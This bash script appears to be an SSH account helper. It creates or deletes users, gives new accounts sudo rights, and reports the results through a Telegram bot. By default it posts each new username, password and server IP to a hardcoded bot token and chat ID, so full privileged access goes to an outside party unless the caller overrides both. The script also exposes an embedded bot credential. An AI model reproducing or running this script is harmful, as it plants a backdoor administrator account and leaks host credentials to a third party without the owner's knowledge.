function send_telegram_message() {
    local MESSAGE=$1
    local INLINE_KEYBOARD='{"inline_keyboard":[[{"text":"Powered By","url":"https://t.me/NorSodikin"}]]}'
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id=$CHAT_ID \
        -d text="$MESSAGE" \
        -d parse_mode=Markdown \
        -d reply_markup="$INLINE_KEYBOARD"
}

function generate_random_string() {
    local LENGTH=$1
    < /dev/urandom tr -dc A-Za-z0-9 | head -c $LENGTH
}

while getopts "a:b:c:p:u:" OPTION; do
    case $OPTION in
        a) ACTION=$OPTARG ;;
        b) BOT_TOKEN=$OPTARG ;;
        c) CHAT_ID=$OPTARG ;;
        p) SSH_PASSWORD=$OPTARG ;;
        u) SSH_USERNAME=$OPTARG ;;
        *) echo "Invalid option"; exit 1 ;;
    esac
done


BOT_TOKEN=${BOT_TOKEN:-"7419614345:AAFwmSvM0zWNaLQhDLidtZ-B9Tzp-aVWICA"}
CHAT_ID=${CHAT_ID:-1964437366}
SSH_USERNAME=${SSH_USERNAME:-$(generate_random_string 8)}
SSH_PASSWORD=${SSH_PASSWORD:-$(generate_random_string 12)}


case $ACTION in
  add)
    if id "$SSH_USERNAME" &>/dev/null; then
        MESSAGE="User $SSH_USERNAME already exists. Please choose a different username."
    else
        sudo adduser --disabled-password --gecos "" $SSH_USERNAME --force-badname
        echo "$SSH_USERNAME:$SSH_PASSWORD" | sudo chpasswd
        sudo usermod -aG sudo $SSH_USERNAME

        HOSTNAME=$(hostname -I | cut -d' ' -f1)
        MESSAGE="*SSH login information:*%0A%0A*Username:* $SSH_USERNAME%0A*Password:* $SSH_PASSWORD%0A*Hostname:* $HOSTNAME%0A%0A_Use the above information to connect using PuTTY or any SSH client._"
    fi

    send_telegram_message "$MESSAGE"
    ;;

  delete)
    if ! id "$SSH_USERNAME" &>/dev/null; then
        MESSAGE="User $SSH_USERNAME does not exist."
    else
        sudo usermod --expiredate 1 $SSH_USERNAME
        sudo deluser --remove-home $SSH_USERNAME
        MESSAGE="User $SSH_USERNAME has been deleted from the system and can no longer log in."
    fi

    send_telegram_message "$MESSAGE"
    ;;

  *)
    echo "Invalid action. Use 'add' to add a user or 'delete' to delete a user."
    ;;
esac
